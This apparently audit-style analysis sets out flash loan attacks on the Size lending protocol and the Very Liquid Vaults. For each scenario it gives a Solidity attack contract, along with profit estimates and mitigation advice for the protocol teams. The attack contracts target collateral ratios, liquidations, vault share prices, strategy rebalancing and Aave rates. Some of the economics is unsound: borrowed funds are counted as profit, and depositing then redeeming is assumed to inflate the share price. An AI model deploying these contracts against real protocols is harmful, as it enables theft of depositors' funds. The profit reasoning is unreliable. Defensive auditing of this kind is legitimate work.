# Flash Loan Attack Surface Analysis: Detailed Scenarios and Profitability

## 1. Size Protocol Flash Loan Attack Scenarios

### 1.1 Collateral Ratio Manipulation Attack

**Target Function**: `deposit` → affects `collateralRatio` → enables `sellCreditMarket`

**Attack Scenario**:
1. User has a position that is close to liquidation (collateral ratio just above crLiquidation)
2. Flash loan large amount of collateral token
3. Deposit collateral to increase ratio above liquidation threshold temporarily
4. Execute `sellCreditMarket` to borrow more funds
5. Withdraw collateral and repay flash loan
6. Now have more debt but same collateral, potentially undercollateralized

**Code Implementation**:
```solidity
contract CollateralRatioManipulator {
    ISize public size;
    IERC20 public collateralToken;
    address public userAccount;
    
    constructor(address _size, address _collateralToken, address _userAccount) {
        size = ISize(_size);
        collateralToken = IERC20(_collateralToken);
        userAccount = _userAccount;
    }
    
    function executeAttack(uint256 flashLoanAmount, uint256 borrowAmount, uint256 tenor) external {
        // This would be called from a flash loan provider
        // 1. Receive flash loan (assumed to be handled by flash loan provider)
        
        // 2. Deposit flash loaned collateral to inflate ratio
        collateralToken.approve(address(size), flashLoanAmount);
        size.deposit(DepositParams({
            token: address(collateralToken),
            amount: flashLoanAmount,
            to: userAccount
        }));
        
        // 3. Now with higher collateral ratio, borrow more
        size.sellCreditMarket(SellCreditMarketParams({
            lender: userAccount,
            creditPositionId: type(uint256).max, // Create new position
            amount: borrowAmount,
            tenor: tenor,
            deadline: block.timestamp + 1,
            maxAPR: type(uint256).max, // No APR limit
            exactAmountIn: false,
            collectionId: type(uint256).max,
            rateProvider: address(0)
        }));
        
        // 4. Withdraw the original collateral to repay flash loan
        size.withdraw(WithdrawParams({
            token: address(collateralToken),
            amount: flashLoanAmount,
            to: address(this) // Withdraw to attacker contract
        }));
        
        // 5. Repay flash loan (handled by flash loan provider)
    }
}
```

**Profitability Calculation**:
- Capital required: Flash loan amount + gas costs
- Profit: Additional borrowed funds - flash loan fees - gas
- Risk: If position becomes undercollateralized after attack, it may be liquidated

### 1.2 Liquidation Manipulation Attack

**Target Function**: `liquidate` function with oracle manipulation

**Attack Scenario**:
1. Monitor for positions near liquidation threshold
2. Flash loan to manipulate oracle price downward
3. Execute liquidation at more favorable terms
4. Profit from the liquidation rewards

**Code Implementation**:
```solidity
contract LiquidationManipulator {
    ISize public size;
    IPriceFeed public priceFeed;
    IERC20 public borrowToken;
    
    constructor(address _size, address _priceFeed, address _borrowToken) {
        size = ISize(_size);
        priceFeed = IPriceFeed(_priceFeed);
        borrowToken = IERC20(_borrowToken);
    }
    
    function manipulateAndLiquidate(uint256 debtPositionId, uint256 flashLoanAmount) external {
        // 1. Manipulate oracle price (conceptual - depends on oracle implementation)
        // This would typically involve flash loaning and manipulating DEX prices
        
        // 2. Execute liquidation with manipulated prices
        LiquidateParams memory params = LiquidateParams({
            debtPositionId: debtPositionId,
            minimumCollateralProfit: 0, // Minimal constraint to maximize success
            deadline: block.timestamp + 1
        });
        
        uint256 profit = size.liquidate(params);
        
        // 3. Use profit to help repay flash loan
    }
}
```

## 2. Very Liquid Vaults Flash Loan Attack Scenarios

### 2.1 Share Price Manipulation Attack

**Target Function**: `deposit`/`withdraw` with `totalAssets()` manipulation

**Attack Scenario**:
1. Flash loan large amount of the vault's underlying asset
2. Deposit into vault to inflate share price temporarily
3. Execute withdrawal at inflated price
4. Profit from the price manipulation

**Code Implementation**:
```solidity
contract SharePriceManipulator {
    IVeryLiquidVault public vault;
    IERC20 public asset;
    
    constructor(address _vault) {
        vault = IVeryLiquidVault(_vault);
        asset = IERC20(vault.asset());
    }
    
    function manipulateDepositWithdraw(uint256 flashLoanAmount) external {
        // 1. Receive flash loan of vault's underlying asset
        
        // 2. Deposit to inflate totalAssets
        asset.approve(address(vault), flashLoanAmount);
        uint256 sharesReceived = vault.deposit(flashLoanAmount, address(this));
        
        // 3. Immediately withdraw (if possible, or wait minimal time)
        // This exploits the temporarily inflated share price
        uint256 assetsReceived = vault.redeem(sharesReceived, address(this), address(this));
        
        // 4. If assetsReceived > flashLoanAmount + fees, profit is made
        // 5. Repay flash loan with profit
    }
}
```

### 2.2 Strategy Rebalancing Manipulation

**Target Function**: `rebalance` function with price manipulation

**Attack Scenario**:
1. Flash loan to inflate one strategy's underlying asset balance
2. Trigger rebalancing between strategies
3. Execute at manipulated prices for profit

**Code Implementation**:
```solidity
contract StrategyRebalanceManipulator {
    IVeryLiquidVault public vault;
    
    constructor(address _vault) {
        vault = IVeryLiquidVault(_vault);
    }
    
    function manipulateRebalance(
        IVault strategyFrom, 
        IVault strategyTo, 
        uint256 manipulationAmount,
        uint256 rebalanceAmount
    ) external {
        // 1. Flash loan and deposit to strategyFrom to inflate its value
        // (implementation depends on specific strategy)
        
        // 2. Execute rebalancing at manipulated prices
        vault.rebalance(
            strategyFrom,
            strategyTo,
            rebalanceAmount,
            0.01e18 // 1% max slippage
        );
        
        // 3. The rebalancing happens at manipulated prices
        // 4. Profit from the price differential
    }
}
```

## 3. Combined Cross-Protocol Attack Scenarios

### 3.1 Aave-Based Multi-Protocol Manipulation

Since both protocols interact with Aave, attacks can be coordinated:

**Attack Scenario**:
1. Flash loan on Aave to manipulate supply/demand
2. Affects Size protocol's variable borrow rates
3. Affects Very Liquid Vault's Aave strategy performance
4. Exploit both protocols simultaneously

**Code Implementation**:
```solidity
contract CrossProtocolAttacker {
    ISize public size;
    IVeryLiquidVault public vault;
    IPool public aavePool;  // Aave V3 Pool
    IERC20 public asset;
    
    constructor(address _size, address _vault, address _aavePool, address _asset) {
        size = ISize(_size);
        vault = IVeryLiquidVault(_vault);
        aavePool = IPool(_aavePool);
        asset = IERC20(_asset);
    }
    
    function coordinatedAttack(uint256 flashLoanAmount) external {
        // 1. Flash loan from Aave
        // 2. Manipulate Aave supply to affect variable rates
        aavePool.supply(address(asset), flashLoanAmount, address(this), 0);
        
        // 3. Exploit Size protocol with manipulated rates
        // (e.g., by taking advantage of rate differentials)
        
        // 4. Exploit Very Liquid Vault Aave strategy
        // (e.g., by manipulating when rebalancing occurs)
        
        // 5. Withdraw from Aave and repay flash loan
        aavePool.withdraw(address(asset), flashLoanAmount, address(this));
    }
}
```

## 4. Profitability Analysis

### 4.1 Collateral Ratio Manipulation
- **Capital Required**: Large flash loan of collateral token
- **Potential Profit**: Additional borrowed funds minus fees
- **Example**: 
  - Flash loan: 1000 WETH
  - Additional borrowing: $100,000 worth of borrow token
  - Flash loan fee: ~$100
  - Gas costs: ~$50
  - **Net Profit**: ~$99,850 (if successful and position doesn't get liquidated)

### 4.2 Share Price Manipulation
- **Capital Required**: Large flash loan of vault's underlying asset
- **Potential Profit**: (Inflated share price - fair share price) * transaction amount
- **Example**:
  - Vault assets: $1M, shares: 100k (fair price: $10/share)
  - Manipulation adds $500k temporarily (manipulated price: $15/share)
  - Attack transaction: deposit $100k, get 10k shares
  - Later withdraw: 10k shares → $150k (vs $100k fair value)
  - **Profit**: ~$50k - fees

### 4.3 Liquidation Arbitrage
- **Capital Required**: Amount needed to liquidate position
- **Potential Profit**: Liquidation rewards + protocol fees
- **Example**:
  - Liquidate position with $100k collateral and $80k debt
  - Liquidation reward: 5% of debt = $4k
  - Protocol fee split: additional $1k
  - **Profit**: ~$5k if liquidation is profitable

## 5. Risk Assessment

### 5.1 High-Risk Scenarios
1. **Oracle Manipulation**: Can cause system-wide effects
2. **Liquidation Gaming**: Can drain protocol funds
3. **Share Price Manipulation**: Can harm all vault users

### 5.2 Medium-Risk Scenarios
1. **Cross-protocol Feedback**: Complex but potentially lucrative
2. **Fee Extraction**: Steady but smaller profits

### 5.3 Mitigation Difficulty
- High capital requirements limit casual attackers
- MEV competition can reduce profitability
- Oracle security improvements ongoing
- Protocol-specific mitigations possible

## 6. Recommendations for Protocol Teams

### 6.1 For Size Protocol
1. **Oracle Security**: Implement TWAP oracles, use multiple price feeds
2. **Time Delays**: Add minimum time between deposits and risk-sensitive operations
3. **Circuit Breakers**: Pause operations during extreme market conditions
4. **Monitoring**: Implement real-time anomaly detection

### 6.2 For Very Liquid Vaults
1. **Share Price Protection**: Time-weighted pricing mechanisms
2. **Rebalancing Security**: Minimum time delays, better slippage protection
3. **Strategy Isolation**: Prevent cross-strategy manipulation
4. **Monitoring**: Track unusual deposit/withdraw patterns

### 6.3 General Best Practices
1. **Economic Analysis**: Model potential attack profitability
2. **Stress Testing**: Simulate various market conditions
3. **Regular Audits**: Continuous security review process
4. **Bug Bounties**: Incentivize security research